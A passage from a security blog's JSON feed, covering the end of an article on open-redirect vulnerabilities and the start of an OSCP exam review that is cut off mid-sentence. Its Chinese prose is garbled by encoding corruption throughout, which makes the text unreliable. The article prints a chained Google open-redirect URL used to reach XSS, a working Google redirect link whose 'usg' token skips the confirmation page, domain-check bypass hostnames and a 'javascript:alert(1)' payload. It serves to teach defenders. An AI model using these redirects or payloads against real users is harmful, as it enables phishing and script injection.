çš„é–‹é ­æ˜¯å¦ç‚º <code>https://picasaweb.google.com/data/feed/api</code>ï¼Œå¦‚æœä¸æ˜¯çš„è©±å°±å›å‚³éŒ¯èª¤ã€‚</p>\n<p>æ‰€ä»¥ä½œè€…çš„ç¬¬ä¸€å€‹ç›®æ¨™å°±æ˜¯æ‰¾åˆ° picasa ä¸Šçš„ open redirectï¼Œä»–æœ€å¾Œæ‰¾åˆ°çš„æ˜¯é€™å€‹ç¶²å€ï¼š<code>https://picasaweb.google.com/bye?continue=</code>ï¼Œåªè¦æŠŠé€™å€‹ç¶²å€æ”¹æˆï¼š<code>https://picasaweb.google.com/data/feed/api/../../bye</code>ï¼Œå°±å¯ä»¥æˆåŠŸé€šéè·¯å¾‘çš„æª¢æŸ¥ï¼Œè®“ server èªç‚ºé€™æ˜¯ä¸€å€‹åˆæ³•çš„ URLã€‚</p>\n<p>ä½†é€™é‚„æ²’çµæŸï¼Œå› ç‚º bye?continue= é€™å€‹ redirect ä¹Ÿæœƒæª¢æŸ¥åƒæ•¸ï¼Œcontinue å¿…é ˆæ˜¯ <code>https://google.com</code> é–‹é ­æ‰å¯ä»¥ã€‚å› æ­¤æˆ‘å€‘éœ€è¦æ‰¾åˆ°ç¬¬äºŒå€‹ open redirectï¼Œé€™æ¬¡æ˜¯å­˜åœ¨æ–¼ <a href=\"http://google.com\">google.com</a> ä¸Šé¢ã€‚è€Œ <a href=\"http://google.com\">google.com</a> æœ‰ä¸€å€‹çŸ¥åçš„ open redirect æ˜¯ AMP ç”¨çš„ï¼Œä¾‹å¦‚èªª <code>https://www.google.com/amp/tech-blog.cymetrics.io</code>ï¼Œå°±æœƒé€£åˆ° <a href=\"https://tech-blog.cymetrics.io\">https://tech-blog.cymetrics.io</a> ï¼ˆä¸éæˆ‘å‰›å˜—è©¦äº†ä¸€ä¸‹æœƒå…ˆè·³åˆ°ä¸­é–“é ï¼Œé»æ“Šç¢ºèªå¾Œæ‰æœƒå°å‘ï¼Œæ‡‰è©²æ˜¯é€™åŠŸèƒ½æœ‰ä¿®æ­£éäº†ï¼‰ã€‚</p>\n<p>çµåˆé€™å…©å€‹ open redirectï¼Œå°±å¯ä»¥è®“ proxy å»æŠ“å–æˆ‘å€‘æŒ‡å®šçš„ url çš„å…§å®¹ï¼š</p>\n<pre><code>https://picasaweb.google.com/data/feed/api/../../../bye/?\ncontinue=https%3A%2F%2Fwww.google.com%2Famp/\nyour-domain.example.com/path?querystring\n</code></pre>\n<p>å¯æ˜¯æŠ“äº†ä¹‹å¾Œåªæœƒè¼¸å‡ºæˆ JSONï¼Œæœ‰ä»€éº¼ç”¨å‘¢ï¼Ÿå¾Œç«¯çš„ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">servePhotosProxy</span><span class=\"token punctuation\">(</span>w http<span class=\"token punctuation\">.</span>ResponseWriter<span class=\"token punctuation\">,</span> r <span class=\"token operator\">*</span>http<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    c <span class=\"token operator\">:=</span> <span class=\"token function\">newContext</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> r<span class=\"token punctuation\">.</span>Method <span class=\"token operator\">!=</span> <span class=\"token string\">\"GET\"</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">writeJSONError</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusBadRequest<span class=\"token punctuation\">,</span> <span class=\"token string\">\"invalid request method\"</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span><br>    <span class=\"token punctuation\">}</span><br>    url <span class=\"token operator\">:=</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">FormValue</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>strings<span class=\"token punctuation\">.</span><span class=\"token function\">HasPrefix</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">\"https://picasaweb.google.com/data/feed/api\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">writeJSONError</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusBadRequest<span class=\"token punctuation\">,</span> <span class=\"token string\">\"url parameter is missing or is an invalid endpoint\"</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span><br>    <span class=\"token punctuation\">}</span><br>    req<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">NewRequest</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">writeJSONError</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">,</span> <span class=\"token function\">errStatus</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span><br>    <span class=\"token punctuation\">}</span><br><br><br>    res<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> <span class=\"token function\">httpClient</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Do</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">writeJSONError</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">,</span> <span class=\"token function\">errStatus</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span><br>    <span class=\"token punctuation\">}</span><br><br><br>    <span class=\"token keyword\">defer</span> res<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    w<span class=\"token punctuation\">.</span><span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><br>    w<span class=\"token punctuation\">.</span><span class=\"token function\">WriteHeader</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>StatusCode<span class=\"token punctuation\">)</span><br>    io<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>å› ç‚ºæœ‰è¨­ç½® content typeï¼Œæ‰€ä»¥æ²’è¾¦æ³•ç”¨ MIME sniffing å»æ”»æ“Šã€‚ç°¡å–®è§£é‡‹ä¸€ä¸‹ MIME sniffingï¼Œç•¶ä½ çš„ response æ²’æœ‰è¨­ç½® content type çš„æ™‚å€™ï¼Œç€è¦½å™¨å°±æœƒè‡ªå‹•å»çŒœé€™æ˜¯ä»€éº¼å…§å®¹ï¼Œå¦‚æœè£¡é¢å«æœ‰ HTML çš„è©±ï¼Œé‚£å°±æœƒè¢«ç•¶æˆæ˜¯ HTML ç¶²ç«™ä¾†è§£æä¸¦ä¸”æ¸²æŸ“ã€‚</p>\n<p>è€Œä½œè€…ç™¼ç¾äº†å¦ä¸€å€‹ bugï¼Œå°±æ˜¯å¦‚æœæ˜¯ error çš„è©±ï¼Œä¸¦ä¸æœƒè¨­ç½® content typeï¼Œåªæœ‰æˆåŠŸçš„æ™‚å€™æœƒï¼Œæ‰€ä»¥å¯ä»¥æ•…æ„å›å‚³ä¸€å€‹å«æœ‰ HTML çš„éŒ¯èª¤è¨Šæ¯ï¼Œé€™æ¨£è¢«å°åœ¨ç•«é¢æ™‚ç€è¦½å™¨å°±æœƒæŠŠé€™æ•´ä»½ç•¶æˆæ˜¯ HTMLï¼Œé€²è€Œé”æˆ XSSï¼è©³ç´°çš„æµç¨‹è·Ÿä»‹ç´¹åŸæ–‡éƒ½å¯«å¾—å¾ˆæ¸…æ¥šï¼Œå¾ˆæ¨è–¦å¤§å®¶å»çœ‹ä¸€ä¸‹åŸæ–‡ã€‚</p>\n<p>ä»¥ä¸Šå°±æ˜¯å…©å€‹åœ¨ Google ä¸­æ›¾ç¶“è¢«ç™¼ç¾çš„ open redirect ä¸²è¯å…¶ä»–æ¼æ´å¼•èµ·çš„æ”»æ“Šï¼Œå…©å€‹éƒ½å¾ˆæœ‰è¶£ï¼</p>\n<p>çœ‹å®Œä¸Šé¢é€™äº›ä¹‹å¾Œï¼Œæˆ‘çªç„¶å¾ˆå¥½å¥‡æœ‰å“ªäº› Google çš„ open redirect æ˜¯å¤§å®¶éƒ½çŸ¥é“çš„ï¼Œæ–¼æ˜¯æˆ‘å°± google äº†ï¼š<code>known google open redirect</code>ï¼Œæ‰¾åˆ°åº•ä¸‹å¹¾å€‹ç¶²ç«™ï¼š</p>\n<ol>\n<li><a href=\"https://nakedsecurity.sophos.com/2020/05/15/how-scammers-abuse-google-searchs-open-redirect-feature/\">How scammers abuse Google Searchâ€™s open redirect feature</a></li>\n<li><a href=\"https://blog.sean-wright.com/google-open-redirect/\">Google - Open Redirect</a></li>\n<li><a href=\"https://www.threatmark.com/google-bug-that-makes-your-bank-more-vulnerable-to-phishing/\">Google Bug that Makes Your Bank More Vulnerable to Phishing</a></li>\n</ol>\n<p>å¦‚æœåªæ˜¯ä¸€èˆ¬çš„ <a href=\"https://www.google.com/url?q=http://tech-blog.cymetrics.io\">https://www.google.com/url?q=http://tech-blog.cymetrics.io</a> çš„è©±ï¼Œé»é€²å»åªæœƒè·³åˆ°ç¢ºèªé é¢ï¼Œä½†å¦‚æœå¾Œé¢åŠ ä¸€å€‹åƒæ•¸ usg çš„è©±ï¼Œå°±å¯ä»¥ä¸ç¶“éç¢ºèªç›´æ¥é‡æ–°å°å‘ï¼Œä¸ä¿¡ä½ é»é»çœ‹é€™å€‹ï¼Œæœƒå» <a href=\"http://example.org\">example.org</a>ï¼š<a href=\"https://www.google.com/url?sa=t&amp;url=http://example.org/&amp;usg=AOvVaw1YigBkNF7L7D2x2Fl532mA\">https://www.google.com/url?sa=t&amp;url=http://example.org/&amp;usg=AOvVaw1YigBkNF7L7D2x2Fl532mA</a></p>\n<p>é‚£é€™å€‹ usg æ˜¯ä»€éº¼å‘¢ï¼Ÿæ‡‰è©²æ˜¯ç¶²å€ç¶“éæŸç¨® hash éå¾Œçš„çµæœï¼Œä½†ä½ ä¸æœƒçŸ¥é“æ€éº¼ç®—å‡ºä¾†çš„ã€‚è€Œè¦ç²å¾—é€™å€‹ usg å…¶å¯¦ä¹Ÿä¸é›£ï¼Œä½ ç”¨ gmail å¯„ä¿¡çµ¦è‡ªå·±ï¼Œä¿¡è£¡é¢è¦æœ‰ä½ æƒ³å°å‘çš„é€£çµï¼Œæ¥è‘—å†ç”¨ HTML basic view ä¾†çœ‹ï¼Œå°±æœƒçœ‹åˆ°ä¿¡ä¸­çš„é€£çµè®Šæˆäº†ä¸Šé¢æ ¼å¼çš„é‡æ–°å°å‘ï¼</p>\n<p>åƒæ˜¯é€™å€‹ï¼Œå°±æ˜¯æˆ‘å€‘éƒ¨è½æ ¼çš„é‡æ–°å°å‘é€£çµï¼š<a href=\"https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug\">https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug</a></p>\n<p>å¯¦æ¸¬ä¹‹å¾Œç™¼ç¾çœŸçš„èƒ½ä¸ç¶“éç¢ºèªå°±è·³è½‰ï¼Œé€™å€‹åŠŸèƒ½å¥½åƒå·²ç¶“å­˜åœ¨æ»¿ä¹…äº†ï¼Œæœªä¾†å¦‚æœæœ‰éœ€è¦ <a href=\"http://google.com\">google.com</a> çš„ open redirect å¯ä»¥åƒè€ƒçœ‹çœ‹ã€‚</p>\n<h2 id=\"%E6%AA%A2%E6%9F%A5-redirect-%E7%9A%84-domain\"><a class=\"direct-link\" href=\"#%E6%AA%A2%E6%9F%A5-redirect-%E7%9A%84-domain\">#</a> æª¢æŸ¥ redirect çš„ domain</h2>\n<p>å¥½ï¼Œæ¥è‘—è¬›å›å‰›å‰›å•å¤§å®¶çš„å…©ç¨®ç¹éæ–¹å¼ï¼Œæˆ‘å†è²¼ä¸€æ¬¡æª¢æŸ¥ domain çš„ç¨‹å¼ç¢¼ï¼Œè®“å¤§å®¶å›æ†¶ä¸€ä¸‹ï¼Œæ¥è‘—å°±ç›´æ¥å…¬å¸ƒç­”æ¡ˆï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> validDomain <span class=\"token operator\">=</span> <span class=\"token string\">'cymetrics.io'</span><br><span class=\"token keyword\">function</span> <span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">url</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> host <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname <span class=\"token comment\">// å–å‡º hostname</span><br>  <span class=\"token keyword\">return</span> host<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>validDomain<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://example.com'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// false</span><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://cymetrics.io'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span><br><span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://dev.cymetrics.io'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></code></pre>\n<p>é€™æ˜¯åœ¨æª¢æŸ¥ domain æ™‚æ»¿å¸¸æœƒçŠ¯çš„éŒ¯èª¤ï¼Œå› ç‚ºæ²’æœ‰è€ƒæ…®åˆ°ä»¥ä¸‹å…©ç¨®æƒ…å½¢ï¼š</p>\n<ol>\n<li><a href=\"http://cymetrics.io.huli.tw\">cymetrics.io.huli.tw</a></li>\n<li><a href=\"http://fakecymetrics.io\">fakecymetrics.io</a></li>\n</ol>\n<p>ä¸Šé¢é€™å…©ç¨®æƒ…å½¢éƒ½ç¬¦åˆæ¢ä»¶ï¼Œä½†å»ä¸æ˜¯æˆ‘å€‘æƒ³è¦çš„çµæœã€‚</p>\n<p>å…¶å¯¦ä¸åªæ˜¯æª¢æŸ¥ domainï¼Œåœ¨åšä»»ä½•æª¢æŸ¥çš„æ™‚å€™ç”¨ <code>includes</code> æˆ–æ˜¯ <code>contains</code> ç›´æ¥å»çœ‹æ•´é«”æ˜¯å¦åŒ…å«æŸå€‹å­—ä¸²éƒ½æ˜¯ä¸€ä»¶æ¯”è¼ƒå±éšªçš„äº‹æƒ…ã€‚æœ€å¥½çš„æ–¹å¼å…¶å¯¦æ˜¯è¨­ä¸€å€‹ allow list ä¸¦ä¸”è¦å®Œå…¨ä¸€è‡´æ‰é€šéï¼Œé€™æ¨£æ˜¯æœ€åš´æ ¼çš„ã€‚ä½†å¦‚æœæƒ³è¦å…è¨±æ‰€æœ‰ subdomain çš„è©±ï¼Œå¯ä»¥é€™æ¨£æª¢æŸ¥ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> validDomain <span class=\"token operator\">=</span> <span class=\"token string\">'cymetrics.io'</span><br><span class=\"token keyword\">function</span> <span class=\"token function\">validateDomain</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">url</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> host <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname <span class=\"token comment\">// å–å‡º hostname</span><br>  <span class=\"token keyword\">return</span> host <span class=\"token operator\">===</span> validDomain <span class=\"token operator\">||</span> host<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> validDomain<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>subdomain çš„éƒ¨åˆ†çµå°¾è¦æ˜¯ <code>.cymetrics.io</code>ï¼Œæ‰€ä»¥ä¸€å®šæœƒæ˜¯ <a href=\"http://cymetrics.io\">cymetrics.io</a> çš„ subdomainï¼Œè€Œä¸»è¦çš„ domain ä¹Ÿè¦å®Œå…¨ç¬¦åˆæ‰å¯ä»¥ã€‚ä¸éé€™æ¨£å¯«çš„è©±ï¼Œå¦‚æœæŸä¸€å€‹ä¸ç›¸å¹²çš„ subdomain æœ‰ open redirect çš„æ¼æ´ï¼Œé€™æ®µå°±ç ´åŠŸäº†ã€‚å› æ­¤é‚„æ˜¯å»ºè­°å¤§å®¶åªæŠŠç¢ºå®šæœƒ redirect çš„ domain æ”¾é€²å»ä¸¦ä¸”ç›´æ¥ç”¨ <code>===</code> åšæª¢æŸ¥ï¼Œé¿å…é€™ç¨®ç‹€æ³ç™¼ç”Ÿã€‚</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> çµèª</h2>\n<p>é‡æ–°å°å‘æ˜¯å€‹å¾ˆå¸¸è¦‹çš„åŠŸèƒ½ï¼Œæœ€å¸¸è¦‹çš„å°±æ˜¯ç™»å…¥å‰é»äº†æŸå€‹é€£çµä¹‹å¾Œè½‰åˆ°ç™»å…¥é é¢ï¼Œç™»å…¥æˆåŠŸå°±æœƒè‡ªå‹•è·³è½‰å›å»ã€‚åœ¨åšé€™å€‹åŠŸèƒ½æ™‚ï¼Œå¦‚æœæ˜¯å‰ç«¯é‡æ–°å°å‘ï¼Œå†æ¬¡æé†’å¤§å®¶ï¼Œè¦è€ƒæ…®åˆ° <code>window.location = 'javascript:alert(1)'</code> é€™æ¨£æœƒå‡ºäº‹ï¼Œè«‹ç¢ºèªé‡æ–°å°å‘çš„ URL æ˜¯åˆæ³•çš„ URL å†åšå‹•ä½œã€‚å¦å¤–ï¼Œä¹Ÿè¦ç¢ºèªæª¢æŸ¥ domain æ™‚æœ‰è€ƒæ…®åˆ°å¯èƒ½æœƒè¢«ç¹éçš„ç‹€æ³ï¼Œç›¡å¯èƒ½ç”¨æœ€åš´è¬¹çš„æ–¹å¼å»è™•ç†ã€‚</p>\n<p>ä»¥ä¸Šå°±æ˜¯å° open redirect çš„ä»‹ç´¹ï¼Œå¸Œæœ›å°å¤§å®¶æœ‰å¹«åŠ©ï¼Œæœ‰ä»€éº¼ç–‘å•æˆ–æ˜¯å¯«éŒ¯çš„åœ°æ–¹éƒ½å¯ä»¥åœ¨ä¸‹é¢ç•™è¨€è·Ÿæˆ‘è¨è«–ã€‚</p>\n<p>åƒè€ƒè³‡æ–™ï¼š</p>\n<ol>\n<li><a href=\"https://blog.detectify.com/2019/05/16/the-real-impact-of-an-open-redirect/\">The real impact of an Open Redirect vulnerability</a></li>\n<li><a href=\"https://blog.intigriti.com/hackademy/open-redirect/\">Intigriti: Open Redirect</a></li>\n<li><a href=\"https://gauravnarwani.com/misconfigured-oauth-to-account-takeover/\">Misconfigured OAuth leading to Account Takeover</a></li>\n<li><a href=\"https://s0cket7.com/open-redirect-vulnerability/\">Open Redirect Vulnerability</a></li>\n<li><a href=\"https://devcraft.io/2020/10/19/github-gist-account-takeover.html\">GitHub Gist - Account takeover via open redirect - $10,000 Bounty</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover\">OAuth to Account takeover</a></li>\n</ol>\n",
      "date_published": "2021-09-07T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/oscp-review/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/oscp-review/",
      "title": "æˆ‘å€‘èˆ‡ OSCP çš„è·é›¢",
      "content_html": "<!-- summary --> \n<!-- å…«æœˆçš„æŸä¸€å€‹å‡Œæ™¨ï¼Œçµ‚æ–¼å®Œæˆå ±å‘Šç„¶å¾Œè·Ÿè€ƒå®˜é“åˆ¥çµæŸè€ƒè©¦ï¼ŒåŠå¹´çš„å¥®æˆ°ä¹Ÿå‘Šä¸€æ®µè½ã€‚æœŸå¾…å·²ä¹…çš„ OSCP åˆ°æ‰‹å•¦ï¼åŠå¹´å‰ OSCP å°æˆ‘è€Œè¨€ä¹Ÿæ˜¯ castle in the cloudï¼Œä»Šå¤©ä¾†åˆ†äº«é€™å¼µè­‰ç…§æ˜¯ä»€éº¼ï¼Œä»¥åŠæˆ‘è‡ªå·±çš„æº–å‚™éç¨‹èˆ‡å¿ƒå¾—ã€‚ -->\n<!-- summary -->\n<p>è³‡å®‰é ˜åŸŸä¸­ï¼Œå¤šæ•¸äººéƒ½è½éä¸€å¼µæ¨™æ¦œæœ€æœ‰å…¬ä¿¡åŠ›çš„è­‰ç…§ï¼Œå°±æ˜¯ä¸å°‘å…¬å¸è·Ÿæ±‚è·è€…è¶¨ä¹‹è‹¥é¶©çš„ OSCPã€‚<br>\nå¸¸è½å¾ˆå¤šäººèªªï¼ŒOSCP è­‰ç…§æ˜¯ã€å°é­”ç‹ã€ï¼Œè€ƒå‰åƒåœ¨åœ°ç„çˆ¬ä¸€åœˆï¼Œè€ƒå®Œå‰é€”ä¸€ç‰‡å…‰æ˜ï¼Œå¤šå°‘äººè€ƒäº†å››äº”æ¬¡éƒ½æ²’éï¼Œç°¡ç›´ä¸è¦å¤ªæ®˜å¿ã€‚é€™å¼µè­‰ç…§åˆ°åº•æ˜¯ä½•æ–¹ç¥è–èƒ½è¢«å½¢å®¹æˆé€™æ¨£å‘¢ï¼Ÿ</p>\n<h2 id=\"%E9%97%9C%E6%96%BC-oscp\"><a class=\"direct-link\" href=\"#%E9%97%9C%E6%96%BC-oscp\">#</a> é—œæ–¼ OSCP</h2>\n<p>OSCP ï¼ˆOffensive Security Certified Professionalï¼‰æ˜¯ Offensive Security é€™å®¶å…¬å¸ç™¼è¡Œçš„ä¸€ç³»åˆ—è­‰ç…§ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯ä»–çš„å…¥é–€æ¬¾ç¬¬ä¸€å¼µï¼ˆå°ä½ æ²’è½éŒ¯ï¼Œé€™å€‹å¤§é­”ç‹å…¶å¯¦æ˜¯é›£åº¦æ¯”è¼ƒä½çš„åŸºç¤æ¬¾å–”ï¼‰\bã€‚Offensive Security æ¯éš”ä¸€é™£å­å°±æœƒæ›´æ–°èª²ç¨‹å…§å®¹è·Ÿè­‰ç…§é¡å‹ï¼Œæ‰€ä»¥æœ‰ä¸€äº›è­‰ç…§ç¾åœ¨å·²ç¶“ä¸èƒ½è€ƒæˆ–æ˜¯æ”¹åäº†ï¼Œç¾éšæ®µç™¼è¡Œçš„è­‰ç…§å¯ä»¥å»å®˜ç¶²æŸ¥è©¢ï¼š<br>\n<figure><img src=\"/img/posts/crystal/oscp/oscp-certs.png\" /><figcaption><p>OSCP è­‰ç…§å€‘</p>\n</figcaption></figure></p>\n<p>å¾ä¸‹é¢é€™å€‹ç·¨è™Ÿå‘½åè¦å‰‡è·Ÿå­¸ç¿’æµç¨‹åœ–ä¹Ÿå¯ä»¥çœ‹å‡º OSCP çš„ç·¨è™Ÿ PEN-200 æ˜¯æœ€åŸºç¤ä¹Ÿæœ€ general çš„ã€‚å¾ŒçºŒæœ‰æ›´æ·±å…¥çš„ OSEP(PEN-300) ä»¥åŠå°ˆç²¾ç¶²é æ”»æ“Šçš„ OSWP(WEB-300) è·Ÿå°ˆæ”» exploit é–‹ç™¼çš„ OSED(EXP-301) OSEE(EXP-401) ç­‰ç­‰ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/certs-journey.png\" /><figcaption><p>PWK journey</p>\n</figcaption></figure></p>\n<p>å¿˜äº†ä¹‹å‰æ˜¯åœ¨å“ªå€‹ç¶²ç«™çœ‹åˆ°çš„ï¼Œæœ‰ä¸€å¼µæˆªæ­¢ä»Šå¹´äºŒæœˆå„ç¨®è³‡å®‰è­‰ç…§çš„ç¤ºæ„åœ–ï¼Œæ„Ÿè¦ºæ‡‰è©²æ˜¯ä¾ç…§é›£åº¦è·Ÿé ˜åŸŸåŠƒåˆ†çš„ï¼Œæ”¾é€™è£¡åƒ…ä¾›æƒ³è€ƒè­‰ç…§çš„äººåƒè€ƒã€‚å¯ä»¥çœ‹åˆ° OSCP åœ¨æœ€å³é‚Šä¸­ä¸Šçš„åœ°æ–¹ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/certs-all.png\" /><figcaption><p>å„ç¨®è³‡å®‰è­‰ç…§</p>\n</figcaption></figure></p>\n<p>å›åˆ° OSCPï¼Œé€™å¼µè­‰ç…§çš„è€ƒè©¦å…§å®¹ç®—æ˜¯æ¯”è¼ƒå»£æ³›çš„ï¼Œå°±æ˜¯æ¨¡æ“¬ä½ é€²åˆ°å…§ç¶²è£¡é¢æœ‰ä¸€å †æ©Ÿå™¨ï¼Œä½ è¦å¦‚ä½•å¿«é€Ÿæ‰¾å‡ºä¸€äº›æ·ºé¡¯çš„å¼±é»ï¼ˆä¾‹å¦‚ç‰ˆæœ¬éèˆŠçš„è»Ÿé«”ã€çœ‹èµ·ä¾†å¾ˆå¯ç–‘çš„ç¶²ç«™ã€æ¬Šé™æ²’é–å¥½çš„æœå‹™ç­‰ç­‰ï¼‰ä¸¦æ”¶é›†è³‡è¨Šï¼Œç„¶å¾Œåˆ©ç”¨é€™äº›å¼±é»é€²åˆ°æ©Ÿå™¨ç²å¾—ä½æ¬Šé™ï¼Œå†è©¦åœ–ææ¬Šæ‹¿åˆ°æœ€é«˜æ¬Šé™ã€‚</p>\n<p>èª¬ OSCP æ˜¯å…¥é–€çš„åŸå› ä¹Ÿæ˜¯å› ç‚ºï¼Œèª²ç¨‹ä¸­å¤§å¤šæ•¸è¨­è¨ˆå¥½çš„ã€æ¼æ´ã€é€šå¸¸éƒ½æ˜¯æœ‰å…¬é–‹ exploit ï¼ˆå¯èƒ½éœ€è¦ä¸€é»æ‰‹å‹•ä¿®æ”¹ï¼‰æˆ–æ˜¯ä¸€äº›éœ€è¦æ‰‹å‹•åŸ·è¡Œä½†æ˜¯æ¦‚å¿µç°¡å–®çš„å•é¡Œï¼ˆä¾‹å¦‚ SQL injectionï¼‰ï¼Œä½†ä¸¦ä¸æœƒéœ€è¦ä½ è‡ªå·±å¾é ­æŒ–æ˜æˆ–æ’°å¯«ä¸€ä»½ exploitï¼ˆç•¶ç„¶ä½ è¦æŠŠæ‰‹å‹•åŸ·è¡Œçš„éƒ¨åˆ†è‡ªå‹•åŒ–ä¹Ÿæ˜¯ä¸éŒ¯çš„ç·´ç¿’ï¼‰ï¼Œç°¡è¨€ä¹‹ï¼Œä¸€åˆ‡éƒ½æ˜¯ã€å·²çŸ¥çš„ã€ï¼Œåªæ˜¯ä½ æœ‰æ²’æœ‰è§€å¯Ÿåˆ°è€Œå·²ã€‚æˆ‘çš„æ„Ÿæƒ³æ˜¯ï¼Œé€™å€‹è€ƒè©¦åªæ˜¯éæ¿¾æ‰ä¸€äº› script kiddie ä¸¦è¨“ç·´ä½ åŸºæœ¬æŠ€å·§çš„ç†Ÿç·´åº¦è·Ÿåˆ†è¾¨ rabbit holeï¼Œä¸æœƒè®“ä½ è®Šæˆæ¼æ´æŒ–æ˜å¤§å¸« XDD</p>\n<h3 id=\"%E8%80%83%E8%A9%A6%E6%96%B9%E5%BC%8F\"><a class=\"direct-link\" href=\"#%E8%80%83%E8%A9%A6%E6%96%B9%E5%BC%8F\">#</a> è€ƒè©¦æ–¹å¼</h3>\n<p>OSCP ä¸æ˜¯ä¸€èˆ¬ç­†è©¦ï¼Œè€Œæ˜¯çµ¦ä½  24 å°æ™‚æ‰“ä¸‹ 5 å°æ©Ÿå™¨çš„ä¸Šæ©Ÿè€ƒï¼Œç„¶å¾Œé‚„æœƒæœ‰ 24 å°æ™‚å¯ä»¥å¯«ä¸€ä»½å®Œæ•´çš„æ»²é€æ¸¬è©¦å 